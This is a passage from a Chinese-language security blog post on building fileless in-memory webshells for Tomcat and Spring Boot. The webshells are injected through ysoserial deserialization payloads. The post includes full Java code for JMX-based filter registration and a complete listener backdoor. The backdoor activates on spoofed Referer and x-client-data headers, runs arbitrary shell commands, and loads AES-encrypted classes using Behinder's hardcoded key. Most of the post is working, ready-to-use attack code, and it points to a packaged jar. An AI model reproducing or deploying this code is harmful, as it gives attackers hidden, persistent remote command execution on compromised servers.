    String payload = request.getReader().readLine();
    if (payload == null || payload.isEmpty()) {
        payload = "";
        // 拿到真实的Request对象而非门面模式的RequestFacade
        Field field = lastRequest.getClass().getDeclaredField("request");
        field.setAccessible(true);
        Request realRequest = (Request) field.get(lastRequest);
        // 从coyoteRequest中拼接body参数
        Field coyoteRequestField = realRequest.getClass().getDeclaredField("coyoteRequest");
        coyoteRequestField.setAccessible(true);
        org.apache.coyote.Request coyoteRequest = (org.apache.coyote.Request) coyoteRequestField.get(realRequest);
        Parameters parameters = coyoteRequest.getParameters();
        Field paramHashValues = parameters.getClass().getDeclaredField("paramHashValues");
        paramHashValues.setAccessible(true);
        LinkedHashMap paramMap = (LinkedHashMap) paramHashValues.get(parameters);
        Iterator>> iterator = paramMap.entrySet().iterator();
        while (iterator.hasNext()) {
            Map.Entry> next = iterator.next();
            String paramKey = next.getKey().replaceAll(" ", "+");
            ArrayList paramValueList = next.getValue();
            String paramValue = paramValueList.get(0);
            if (paramValueList.size() == 0) {
                payload = payload + paramKey;
            } else {
                payload = payload + paramKey + "=" + paramValue;
            }
        }
    }
    System.out.println(payload);
需要注意这里判断payload是否为空，是因为在springboot2.6.3测试时`request.getReader().readLine()`可以获取到payload而采取拼接的话为空，而2.0.9.RELEASE只能采用拼接参数的形式。
到此解决了冰蝎连接的问题，但是实战中并不是这么思路明确的，踩坑过程
  1. 通过jmx注册filter，发现cmdshell都没有
  2. 通过线程注册filter，cmdshell可以 冰蝎连不上
  3. 猜测是spring的问题，于是我又试了spring的拦截器，发现cmd可以冰蝎还是不行。
  4. 最后硬调发现是包装类的问题，解决payload==null的问题。
## springboot中的jmx名称
此时扭过头来看jmx注册servlet、filter，我在本地的tomcat发现可以成功，但是拿到springboot不行。先贴tomcat成功，springboot失败的代码
    static {
        try {
            String filterName = "MyFilterVersion" + System.nanoTime();
            String urlPattern = "/*";
            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);
            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository = (Repository) field.get(obj);
            Set objectSet = repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            for (NamedObject namedObject : objectSet) {
                DynamicMBean dynamicMBean = namedObject.getObject();
                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                field.setAccessible(true);
                obj = field.get(dynamicMBean);
                field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                field.setAccessible(true);
                StandardContext standardContext = (StandardContext) field.get(obj);
                field = standardContext.getClass().getDeclaredField("filterConfigs");
                field.setAccessible(true);
                HashMap map = (HashMap) field.get(standardContext);
                if (map.get(filterName) == null) {
                    //生成 FilterDef
                    //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                    Class filterDefClass = null;
                    try {
                        filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                    } catch (ClassNotFoundException e) {
                        filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                    }
                    Object filterDef = filterDefClass.newInstance();
                    filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, filterName);
                    Filter filter = new TomcatFilterMemShellFromJMX();
                    filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, filter.getClass().getName());
                    filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, filter);
                    standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, filterDef);
                    //设置 FilterMap
                    //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                    Class filterMapClass = null;
                    try {
                        filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                    } catch (ClassNotFoundException e) {
                        filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                    }
                    Object filterMap = filterMapClass.newInstance();
                    filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, filterName);
                    filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, DispatcherType.REQUEST.name());
                    filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, urlPattern);
                    //调用 addFilterMapBefore 会自动加到队列的最前面，不需要原来的手工去调整顺序了
                    standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, filterMap);
                    //设置 FilterConfig
                    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
                    constructor.setAccessible(true);
                    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(new Object[]{standardContext, filterDef});
                    map.put(filterName, filterConfig);
                }
            }
        } catch (Exception e) {
    //            e.printStackTrace();
        }
    }
在springboot动态调试之后发现`Set objectSet = repository.query(new
ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"),
null)`为空集，于是在springboot中寻找jmx对象，发现名字改为了Tomcat而非Catalina，于是加一个if判断就解决了
    if (objectSet.size() == 0) {
        // springboot的jmx中为Tomcat而非Catalina
        objectSet = repository.query(new ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
    }
## Listener内存马
Listener内存马不存在包装类问题，可以直接写，感觉还是这个比较稳。
    package ysoserial.payloads.templates;
    import com.sun.jmx.mbeanserver.NamedObject;
    import com.sun.jmx.mbeanserver.Repository;
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    import org.apache.catalina.connector.Request;
    import org.apache.catalina.connector.RequestFacade;
    import org.apache.catalina.connector.Response;
    import org.apache.catalina.core.StandardContext;
    import org.apache.tomcat.util.modeler.Registry;
    import javax.crypto.Cipher;
    import javax.crypto.spec.SecretKeySpec;
    import javax.management.DynamicMBean;
    import javax.management.MBeanServer;
    import javax.management.ObjectName;
    import javax.servlet.ServletRequestEvent;
    import javax.servlet.ServletRequestListener;
    import javax.servlet.http.HttpSession;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    import java.util.HashMap;
    import java.util.Scanner;
    import java.util.Set;
    public class TomcatListenerMemShellFromJMX extends AbstractTranslet implements ServletRequestListener {
        static {
            try {
                MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
                Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
                field.setAccessible(true);
                Object obj = field.get(mbeanServer);
                field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
                field.setAccessible(true);
                Repository repository = (Repository) field.get(obj);
                Set objectSet = repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
                if (objectSet.size() == 0) {
                    // springboot的jmx中为Tomcat而非Catalina
                    objectSet = repository.query(new ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
                }
                for (NamedObject namedObject : objectSet) {
                    DynamicMBean dynamicMBean = namedObject.getObject();
                    field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                    field.setAccessible(true);
                    obj = field.get(dynamicMBean);
                    field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                    field.setAccessible(true);
                    StandardContext standardContext = (StandardContext) field.get(obj);
                    TomcatListenerMemShellFromJMX listener = new TomcatListenerMemShellFromJMX();
                    standardContext.addApplicationEventListener(listener);
                }
            } catch (Exception e) {
    //            e.printStackTrace();
            }
        }
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
        @Override
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        }
        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {
    // Listener马没有包装类问题
            try {
                RequestFacade requestFacade = (RequestFacade) servletRequestEvent.getServletRequest();
                Field f = requestFacade.getClass().getDeclaredField("request");
                f.setAccessible(true);
                Request request = (Request) f.get(requestFacade);
                Response response = request.getResponse();
                // 入口
                if (request.getHeader("Referer").equalsIgnoreCase("https://www.google.com/")) {
                    // cmdshell
                    if (request.getHeader("x-client-data").equalsIgnoreCase("cmd")) {
                        String cmd = request.getHeader("cmd");
                        if (cmd != null && !cmd.isEmpty()) {
                            String[] cmds = null;
                            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                                cmds = new String[]{"cmd", "/c", cmd};
                            } else {
                                cmds = new String[]{"/bin/bash", "-c", cmd};
                            }
                            String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                            response.resetBuffer();
                            response.getWriter().println(result);
                            response.flushBuffer();
                            response.finishResponse();
                        }
                    } else if (request.getHeader("x-client-data").equalsIgnoreCase("rebeyond")) {
                        if (request.getMethod().equals("POST")) {
                            // 创建pageContext
                            HashMap pageContext = new HashMap();
                            // lastRequest的session是没有被包装的session!!
                            HttpSession session = request.getSession();
                            pageContext.put("request", request);
                            pageContext.put("response", response);
                            pageContext.put("session", session);
                            // 这里判断payload是否为空 因为在springboot2.6.3测试时request.getReader().readLine()可以获取到而采取拼接的话为空字符串
                            String payload = request.getReader().readLine();
    //                        System.out.println(payload);
                            // 冰蝎逻辑
                            String k = "e45e329feb5d925b"; // rebeyond
                            session.putValue("u", k);
                            Cipher c = Cipher.getInstance("AES");
                            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                            Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                            method.setAccessible(true);
                            byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(payload));
                            Class evilclass = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                            evilclass.newInstance().equals(pageContext);
                        }
                    } else {
                        response.resetBuffer();
                        response.getWriter().println("error");
                        response.flushBuffer();
                        response.finishResponse();
                    }
                }
            } catch (Exception e) {
    //            e.printStackTrace();
            }
        }
    }
## 总结
解决了springboot包装类和从jmx中拿到StandardContext的问题，写了servlet、filter、listener、Spring
Interceptor内存马发现Listener内存马兼容性更强，
因为这一个内存马，我和朋友 @汤姆 连着一星期3点睡觉7点起，感觉阎王快夸我好身体了……
打包好的jar包在  下载
**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**
* * *